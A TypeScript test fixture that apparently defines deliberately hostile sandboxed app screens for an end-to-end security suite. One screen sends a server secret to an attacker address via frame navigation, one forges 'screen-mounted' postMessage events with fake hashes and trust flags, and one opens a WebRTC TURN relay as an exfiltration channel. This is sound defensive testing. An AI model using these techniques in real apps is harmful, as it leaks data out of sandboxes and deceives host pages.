/**
 * Apps whose screens attack the page around their frame, for
 * screen-attacks.e2e.ts: one leaves for the attacker's address, one for
 * another address of the page's own origin, one never renders and says it
 * did, one tries WebRTC. What they send carries only
 * made-up markers, to receivers the test runs itself.
 */

const serverCode = `import { DurableObject } from "cloudflare:workers";

export class App extends DurableObject {
  secret(): string {
    return "fictional-marker-7f3a";
  }
}
`;

/**
 * Renders, then sends its own frame to `attacker`, with what its server
 * answered in the address: a sandboxed frame may navigate itself.
 */
const leavingScreen = (
  attacker: string
): string => `import { callServer } from "@grasp-os/sdk/screen";
import { useEffect } from "react";

export default function Leaving() {
  useEffect(() => {
    void callServer<string>("secret").then((secret) => {
      location.href = \`${attacker}/left?carried=\${secret}\`;
    });
  }, []);
  return <main><h1>Leaving</h1></main>;
}
`;

/**
 * Renders, then loads the frame's own document again in its place, as a
 * load the page never started: the one place the page's policy lets a
 * frame go.
 */
const wanderingScreen = `import { useEffect } from "react";

export default function Wandering() {
  useEffect(() => {
    location.href = "/screen-frame?load=a-load-of-its-own";
  }, []);
  return <main><h1>Wandering</h1></main>;
}
`;

/**
 * Never renders: it throws instead. Before that, as its module loads, it
 * tells the page it has mounted, every way a screen can make that up: it
 * can read its frame's load from its own address, but was never told the
 * hash of its code or the page's name for this start.
 */
const stuckScreen = `const load = new URLSearchParams(location.search).get("load");
const made = (text: string): string => text.repeat(64);
const forged = [
  { type: "grasp:screen-mounted", load, artifact: made("0"), generation: crypto.randomUUID() },
  { type: "grasp:screen-mounted", load, artifact: made("a"), generation: load },
  { type: "grasp:screen-mounted", load },
  { type: "grasp:screen-mounted", load, artifact: made("0"), generation: "1", trusted: true, approved: true },
  { type: "grasp:screen-ready", load },
  "grasp:screen-mounted",
];
for (const message of forged) {
  parent.postMessage(message, "*");
}
document.body.dataset.forged = String(forged.length);

export default function Stuck(): never {
  throw new Error("This screen never renders");
}
`;

/**
 * Asks the browser for a relayed connection through a TURN server at
 * `turn`, with a made-up marker as its username, and says what the
 * browser let it do. Nothing in the frame's policy governs this.
 */
const turnScreen = (
  turn: string
): string => `import { useEffect, useState } from "react";

const probe = async (): Promise<string> => {
  if (typeof RTCPeerConnection !== "function") {
    return "unavailable";
  }
  try {
    const connection = new RTCPeerConnection({
      iceServers: [{ urls: "${turn}", username: "fictional-marker-7f3a", credential: "none" }],
      iceTransportPolicy: "relay",
    });
    connection.createDataChannel("probe");
    await connection.setLocalDescription(await connection.createOffer());
    return "gathering";
  } catch {
    return "refused";
  }
};

export default function Turn() {
  const [outcome, setOutcome] = useState("");
  useEffect(() => {
    void probe().then(setOutcome);
  }, []);
  return (
    <main>
      <h1>Turn</h1>
      <output aria-label="WebRTC">{outcome}</output>
    </main>
  );
}
`;

/** The attacking App's files: a screen for each attack. */
export const attackAppFiles = ({
  attacker,
  turn,
}: {
  attacker: string;
  turn: string;
}): Record<string, string> => ({
  "app/server.ts": serverCode,
  "screens/leaving.tsx": leavingScreen(attacker),
  "screens/wandering.tsx": wanderingScreen,
  "screens/stuck.tsx": stuckScreen,
  "screens/turn.tsx": turnScreen(turn),
});
